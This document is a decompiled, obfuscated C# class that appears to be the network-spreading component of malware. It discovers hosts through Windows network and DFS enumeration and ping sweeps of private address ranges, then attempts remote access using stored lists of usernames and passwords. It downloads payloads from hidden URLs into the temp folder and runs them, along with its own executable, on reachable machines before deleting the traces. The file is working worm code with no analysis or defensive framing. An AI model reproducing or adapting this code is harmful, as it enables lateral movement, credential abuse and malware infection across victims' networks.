using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

internal sealed class mFZlqBvzAMO
{
	public sealed class qZFPbqBxzYMffh
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum KujPJVfbLxXbo
	{
		PZQUmepfzlfCG = 1,
		outnZVimqmTla,
		mBdERCLdNmUjb,
		BfVAsRMdHcHNjZ,
		ZYlIqNSnDULJ
	}

	public enum fWhTImCjpvGSJBgd
	{
		qKwygLFqUym,
		mRfKshNcDUOvZH,
		SigXwSwzgGKYUZT,
		MYqcnQMqMET
	}

	public enum OxHtEumIMaxbyz
	{
		XNjnZaKihkAINem = 1,
		rYuLtiqpsPSDRz = 2,
		RZNFAlGgAJbeH = 4,
		siIxvGOVKHqDyE = 8,
		WwhVUXAgYkhn = 16,
		JEgqHatXBUEYBc = 19
	}

	public enum kIvhfwrqevez
	{
		vYLFgUsBoGmMuQ,
		kOvRSZIXMxxNF,
		kXNgEtEmghP,
		uyAJefJVEArEfjD,
		cBrtxVRoUMmFsf,
		dgLMreGYLEdlAv,
		EYHUbvJngOUSiWWN,
		OQIinfViGolpXdL,
		DPeQSiBTiZbO,
		kEFiKufVHfcpb,
		NukrtOMJVNfmzVud,
		fNYSchbstLs
	}

	public sealed class HBpfSJWdOXceL : IEnumerable
	{
		private enum BCUXLNROMuf
		{
			VAwzbifZGvq = 0,
			cPsWCBFkMtmF = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class zmQktoEpZcwOcq
		{
			public KujPJVfbLxXbo FCPmIjWJtzv;

			public fWhTImCjpvGSJBgd bbVwqUtiuKT;

			public kIvhfwrqevez bfcxLCSlQRHSjM;

			public OxHtEumIMaxbyz YItrjhAHuqXQ;

			public string cbUbMOedXqP;

			public string CpNBmPviomW;

			public string rGMQevMVINOBOmc;

			public string TUSquKztdlON;
		}

		private ArrayList XEYTSjJxIAy = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern BCUXLNROMuf WNetOpenEnumA(KujPJVfbLxXbo dwScope, fWhTImCjpvGSJBgd dwType, OxHtEumIMaxbyz dwUsage, zmQktoEpZcwOcq p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern BCUXLNROMuf WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern BCUXLNROMuf WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(zmQktoEpZcwOcq zmQktoEpZcwOcq_0, KujPJVfbLxXbo kujPJVfbLxXbo_0, fWhTImCjpvGSJBgd fWhTImCjpvGSJBgd_0, OxHtEumIMaxbyz oxHtEumIMaxbyz_0, kIvhfwrqevez kIvhfwrqevez_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(kujPJVfbLxXbo_0, fWhTImCjpvGSJBgd_0, oxHtEumIMaxbyz_0, zmQktoEpZcwOcq_0, out lphEnum) == BCUXLNROMuf.VAwzbifZGvq)
			{
				BCUXLNROMuf bCUXLNROMuf;
				do
				{
					bCUXLNROMuf = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (bCUXLNROMuf)
					{
					case BCUXLNROMuf.cPsWCBFkMtmF:
						continue;
					case BCUXLNROMuf.VAwzbifZGvq:
						Marshal.PtrToStructure(intPtr, zmQktoEpZcwOcq_0);
						if (zmQktoEpZcwOcq_0.bfcxLCSlQRHSjM == kIvhfwrqevez_0)
						{
							XEYTSjJxIAy.Add(zmQktoEpZcwOcq_0.CpNBmPviomW);
						}
						if ((zmQktoEpZcwOcq_0.YItrjhAHuqXQ & OxHtEumIMaxbyz.rYuLtiqpsPSDRz) == OxHtEumIMaxbyz.rYuLtiqpsPSDRz)
						{
							EnumerateServers(zmQktoEpZcwOcq_0, kujPJVfbLxXbo_0, fWhTImCjpvGSJBgd_0, oxHtEumIMaxbyz_0, kIvhfwrqevez_0);
						}
						continue;
					}
					break;
				}
				while (bCUXLNROMuf != BCUXLNROMuf.cPsWCBFkMtmF);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public HBpfSJWdOXceL(KujPJVfbLxXbo kujPJVfbLxXbo_0, fWhTImCjpvGSJBgd fWhTImCjpvGSJBgd_0, OxHtEumIMaxbyz oxHtEumIMaxbyz_0, kIvhfwrqevez kIvhfwrqevez_0)
		{
			zmQktoEpZcwOcq zmQktoEpZcwOcq_ = new zmQktoEpZcwOcq();
			EnumerateServers(zmQktoEpZcwOcq_, kujPJVfbLxXbo_0, fWhTImCjpvGSJBgd_0, oxHtEumIMaxbyz_0, kIvhfwrqevez_0);
		}

		public IEnumerator GetEnumerator()
		{
			return XEYTSjJxIAy.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DxpnFpKVbWMXHAo
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string KJOlCGlhtaSKT;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string eSHxdSjGiHq;

		public uint TGNuIwWHMj;

		public uint zZBPHUukCIM;

		public IntPtr hfkJPHkyiVejeB;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct bdTEgedZHCUd
	{
		public int TGNuIwWHMj;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string PvjiLBcqBixP;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string qZsxcwXhktZbt;
	}

	public struct ONKNYdWUDyuYDo
	{
		public string HigyPKmdVB;

		public string[] KeTkvGznJNAPOcU;

		public ONKNYdWUDyuYDo(string string_0, string[] string_1)
		{
			HigyPKmdVB = string_0;
			KeTkvGznJNAPOcU = string_1;
		}
	}

	private sealed class ieZsuuJmYzrs
	{
		public string umvNhCSmMDsf;

		public string oEOGstUprwln;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107358255)) && !string_0.StartsWith(getString_0(107358282)) && !string_0.StartsWith(getString_0(107358273)) && !string_0.Contains(getString_0(107359748))) || !eOWxopOjsZrmiq(string_0))
			{
				return;
			}
			try
			{
				if (pjsEsrnLXK.SqakArWPOJIp == getString_0(107396960))
				{
					for (int i = 0; i < BqMsGJyQcG.Count; i++)
					{
						pjsEsrnLXK.zNySGPYjPOmLG(getString_0(107358314), getString_0(107358228) + string_0 + getString_0(107358251) + BqMsGJyQcG[i] + getString_0(107358260) + rFrlUidqHg[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					pjsEsrnLXK.zNySGPYjPOmLG(getString_0(107358314), getString_0(107358228) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (pjsEsrnLXK.SqakArWPOJIp == getString_0(107396960))
			{
				for (int j = 0; j < BqMsGJyQcG.Count; j++)
				{
					if (pjsEsrnLXK.CrfQrweeRBySRR)
					{
						if (File.Exists(umvNhCSmMDsf))
						{
							pjsEsrnLXK.zNySGPYjPOmLG(umvNhCSmMDsf, getString_0(107356866) + string_0 + getString_0(107369443) + BqMsGJyQcG[j] + getString_0(107368890) + rFrlUidqHg[j] + getString_0(107368881) + Assembly.GetEntryAssembly()!.Location + getString_0(107356820));
						}
					}
					else if (File.Exists(oEOGstUprwln))
					{
						pjsEsrnLXK.zNySGPYjPOmLG(oEOGstUprwln, getString_0(107356866) + string_0 + getString_0(107369443) + BqMsGJyQcG[j] + getString_0(107368890) + rFrlUidqHg[j] + getString_0(107368848) + Assembly.GetEntryAssembly()!.Location + getString_0(107356820));
					}
				}
			}
			else if (pjsEsrnLXK.CrfQrweeRBySRR)
			{
				if (File.Exists(umvNhCSmMDsf))
				{
					pjsEsrnLXK.zNySGPYjPOmLG(umvNhCSmMDsf, getString_0(107356866) + string_0 + getString_0(107368791) + Assembly.GetEntryAssembly()!.Location + getString_0(107356820));
				}
			}
			else if (File.Exists(oEOGstUprwln))
			{
				pjsEsrnLXK.zNySGPYjPOmLG(oEOGstUprwln, getString_0(107356866) + string_0 + getString_0(107368758) + Assembly.GetEntryAssembly()!.Location + getString_0(107356820));
			}
		}

		static ieZsuuJmYzrs()
		{
			Strings.CreateGetStringDelegate(typeof(ieZsuuJmYzrs));
		}
	}

	private sealed class lBQvJFUvhJLq
	{
		public string cZuGDEPekxdDd;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != cZuGDEPekxdDd;
		}
	}

	public static List<string> lpxSBChAdhWOIEk;

	public static string tUJWdbCTaSv;

	public static List<string> BqMsGJyQcG;

	public static List<string> rFrlUidqHg;

	public static List<string> PymPjIcPUiv;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<qZFPbqBxzYMffh> qZORccJMjejzNdIjl()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397203);
			process.StartInfo.Arguments = getString_0(107369904);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<qZFPbqBxzYMffh> list = new List<qZFPbqBxzYMffh>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107369343))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new qZFPbqBxzYMffh
						{
							ServerName = getString_0(107397176) + stringBuilder.ToString() + getString_0(107369330)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string KgMPqdLblor, int XuYBDKYvIxzFRf, int EIwuXyoIHTJkw, out IntPtr dYCZlAIKSrA, [MarshalAs(UnmanagedType.I4)] out int GOzYISQvWkH, [MarshalAs(UnmanagedType.I4)] ref int VMUBMYEeod);

	public static List<ONKNYdWUDyuYDo> VkhEzBKXgRaGbN(string string_0)
	{
		try
		{
			List<ONKNYdWUDyuYDo> list = new List<ONKNYdWUDyuYDo>();
			IntPtr dYCZlAIKSrA = default(IntPtr);
			int GOzYISQvWkH = 0;
			int VMUBMYEeod = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out dYCZlAIKSrA, out GOzYISQvWkH, ref VMUBMYEeod) == 0)
			{
				for (int i = 0; i < GOzYISQvWkH; i++)
				{
					DxpnFpKVbWMXHAo dxpnFpKVbWMXHAo = (DxpnFpKVbWMXHAo)Marshal.PtrToStructure(dYCZlAIKSrA + i * Marshal.SizeOf(typeof(DxpnFpKVbWMXHAo)), typeof(DxpnFpKVbWMXHAo));
					if (dxpnFpKVbWMXHAo.KJOlCGlhtaSKT == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < dxpnFpKVbWMXHAo.zZBPHUukCIM; j++)
					{
						IntPtr ptr = new IntPtr(dxpnFpKVbWMXHAo.hfkJPHkyiVejeB.ToInt64() + j * Marshal.SizeOf(typeof(bdTEgedZHCUd)));
						bdTEgedZHCUd bdTEgedZHCUd = (bdTEgedZHCUd)Marshal.PtrToStructure(ptr, typeof(bdTEgedZHCUd));
						if (bdTEgedZHCUd.TGNuIwWHMj == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107356809),
								bdTEgedZHCUd.PvjiLBcqBixP,
								bdTEgedZHCUd.qZsxcwXhktZbt
							}));
						}
					}
					string text = dxpnFpKVbWMXHAo.KJOlCGlhtaSKT.Replace(string_0, getString_0(107359691));
					if (text.StartsWith(getString_0(107397176)))
					{
						text = text.Substring(1);
					}
					list.Add(new ONKNYdWUDyuYDo(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void IqyugUDDOhuf()
	{
		pjsEsrnLXK.dDDHNeRQePOv(getString_0(107369321));
		List<qZFPbqBxzYMffh> list = qZORccJMjejzNdIjl();
		List<ONKNYdWUDyuYDo> list2 = VkhEzBKXgRaGbN(Environment.MachineName);
		if (list2 != null)
		{
			foreach (ONKNYdWUDyuYDo item in list2)
			{
				string[] keTkvGznJNAPOcU = item.KeTkvGznJNAPOcU;
				foreach (string text in keTkvGznJNAPOcU)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (pjsEsrnLXK.SqakArWPOJIp == getString_0(107396903))
						{
							for (int j = 0; j < BqMsGJyQcG.Count; j++)
							{
								pjsEsrnLXK.zNySGPYjPOmLG(getString_0(107358257), getString_0(107357588) + text + getString_0(107358194) + BqMsGJyQcG[j] + getString_0(107358203) + rFrlUidqHg[j]);
							}
						}
						else
						{
							pjsEsrnLXK.zNySGPYjPOmLG(getString_0(107358257), getString_0(107357588) + text);
						}
						pjsEsrnLXK.tfMMirUIsESlo.Add(text.Replace(getString_0(107356758), getString_0(107359691)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (qZFPbqBxzYMffh item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (pjsEsrnLXK.SqakArWPOJIp == getString_0(107396903))
				{
					for (int k = 0; k < BqMsGJyQcG.Count; k++)
					{
						pjsEsrnLXK.zNySGPYjPOmLG(getString_0(107358257), getString_0(107357588) + item2.ServerName + getString_0(107358194) + BqMsGJyQcG[k] + getString_0(107358203) + rFrlUidqHg[k]);
					}
				}
				else
				{
					pjsEsrnLXK.zNySGPYjPOmLG(getString_0(107358257), getString_0(107357588) + item2.ServerName);
				}
				pjsEsrnLXK.tfMMirUIsESlo.Add(item2.ServerName.Replace(getString_0(107356758), getString_0(107359691)));
			}
			catch
			{
			}
		}
	}

	public static void QgMoLQlRhXBO()
	{
		ieZsuuJmYzrs CS_0024_003C_003E8__locals0 = new ieZsuuJmYzrs();
		List<aJwHCMVaMTUb> list = aJwHCMVaMTUb.rBAeUrxGkYntM();
		foreach (aJwHCMVaMTUb item in list)
		{
			lpxSBChAdhWOIEk.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.umvNhCSmMDsf = getString_0(107359691);
		CS_0024_003C_003E8__locals0.oEOGstUprwln = getString_0(107359691);
		try
		{
			CS_0024_003C_003E8__locals0.umvNhCSmMDsf = DanDrthOwLvIoI();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.oEOGstUprwln = cRXujBLvhL();
		}
		catch
		{
		}
		foreach (aJwHCMVaMTUb item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107358198)) || item2.IPAddress.StartsWith(getString_0(107358225)) || item2.IPAddress.StartsWith(getString_0(107358216)) || item2.IPAddress.Contains(getString_0(107359691)))
				{
					FdJbpbBuFC.NnlAqwvHAqeTL(item2.MacAddress, item2.IPAddress, getString_0(107369236));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(lpxSBChAdhWOIEk, delegate(string string_0)
			{
				if ((string_0.StartsWith(ieZsuuJmYzrs.getString_0(107358255)) || string_0.StartsWith(ieZsuuJmYzrs.getString_0(107358282)) || string_0.StartsWith(ieZsuuJmYzrs.getString_0(107358273)) || string_0.Contains(ieZsuuJmYzrs.getString_0(107359748))) && eOWxopOjsZrmiq(string_0))
				{
					try
					{
						if (pjsEsrnLXK.SqakArWPOJIp == ieZsuuJmYzrs.getString_0(107396960))
						{
							for (int i = 0; i < BqMsGJyQcG.Count; i++)
							{
								pjsEsrnLXK.zNySGPYjPOmLG(ieZsuuJmYzrs.getString_0(107358314), ieZsuuJmYzrs.getString_0(107358228) + string_0 + ieZsuuJmYzrs.getString_0(107358251) + BqMsGJyQcG[i] + ieZsuuJmYzrs.getString_0(107358260) + rFrlUidqHg[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							pjsEsrnLXK.zNySGPYjPOmLG(ieZsuuJmYzrs.getString_0(107358314), ieZsuuJmYzrs.getString_0(107358228) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (pjsEsrnLXK.SqakArWPOJIp == ieZsuuJmYzrs.getString_0(107396960))
					{
						for (int j = 0; j < BqMsGJyQcG.Count; j++)
						{
							if (pjsEsrnLXK.CrfQrweeRBySRR)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.umvNhCSmMDsf))
								{
									pjsEsrnLXK.zNySGPYjPOmLG(CS_0024_003C_003E8__locals0.umvNhCSmMDsf, ieZsuuJmYzrs.getString_0(107356866) + string_0 + ieZsuuJmYzrs.getString_0(107369443) + BqMsGJyQcG[j] + ieZsuuJmYzrs.getString_0(107368890) + rFrlUidqHg[j] + ieZsuuJmYzrs.getString_0(107368881) + Assembly.GetEntryAssembly()!.Location + ieZsuuJmYzrs.getString_0(107356820));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.oEOGstUprwln))
							{
								pjsEsrnLXK.zNySGPYjPOmLG(CS_0024_003C_003E8__locals0.oEOGstUprwln, ieZsuuJmYzrs.getString_0(107356866) + string_0 + ieZsuuJmYzrs.getString_0(107369443) + BqMsGJyQcG[j] + ieZsuuJmYzrs.getString_0(107368890) + rFrlUidqHg[j] + ieZsuuJmYzrs.getString_0(107368848) + Assembly.GetEntryAssembly()!.Location + ieZsuuJmYzrs.getString_0(107356820));
							}
						}
					}
					else if (pjsEsrnLXK.CrfQrweeRBySRR)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.umvNhCSmMDsf))
						{
							pjsEsrnLXK.zNySGPYjPOmLG(CS_0024_003C_003E8__locals0.umvNhCSmMDsf, ieZsuuJmYzrs.getString_0(107356866) + string_0 + ieZsuuJmYzrs.getString_0(107368791) + Assembly.GetEntryAssembly()!.Location + ieZsuuJmYzrs.getString_0(107356820));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.oEOGstUprwln))
					{
						pjsEsrnLXK.zNySGPYjPOmLG(CS_0024_003C_003E8__locals0.oEOGstUprwln, ieZsuuJmYzrs.getString_0(107356866) + string_0 + ieZsuuJmYzrs.getString_0(107368758) + Assembly.GetEntryAssembly()!.Location + ieZsuuJmYzrs.getString_0(107356820));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.umvNhCSmMDsf))
			{
				File.Delete(CS_0024_003C_003E8__locals0.umvNhCSmMDsf);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.oEOGstUprwln))
			{
				File.Delete(CS_0024_003C_003E8__locals0.oEOGstUprwln);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string DanDrthOwLvIoI()
	{
		if (IntPtr.Size == 8)
		{
			return MJyZvapNhIqJRu(new Uri(pjsEsrnLXK.rZFwMCmAYamD(getString_0(107369183))));
		}
		return MJyZvapNhIqJRu(new Uri(pjsEsrnLXK.rZFwMCmAYamD(getString_0(107369183))));
	}

	public static string cRXujBLvhL()
	{
		if (IntPtr.Size == 8)
		{
			return MJyZvapNhIqJRu(new Uri(pjsEsrnLXK.rZFwMCmAYamD(getString_0(107369134))));
		}
		return MJyZvapNhIqJRu(new Uri(pjsEsrnLXK.rZFwMCmAYamD(getString_0(107369537))));
	}

	public static bool eOWxopOjsZrmiq(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string MJyZvapNhIqJRu(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107369464), getString_0(107359691)).Remove(0, 3) + getString_0(107369491);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> oAGITtnTwess()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107369482));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107369417)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107369372));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				lBQvJFUvhJLq CS_0024_003C_003E8__locals0 = new lBQvJFUvhJLq();
				CS_0024_003C_003E8__locals0.cZuGDEPekxdDd = array4[j];
				if (CS_0024_003C_003E8__locals0.cZuGDEPekxdDd.Contains(getString_0(107369391)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.cZuGDEPekxdDd).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static mFZlqBvzAMO()
	{
		Strings.CreateGetStringDelegate(typeof(mFZlqBvzAMO));
		lpxSBChAdhWOIEk = new List<string>();
		tUJWdbCTaSv = getString_0(107359691);
		BqMsGJyQcG = new List<string>();
		rFrlUidqHg = new List<string>();
		PymPjIcPUiv = new List<string>();
	}
}
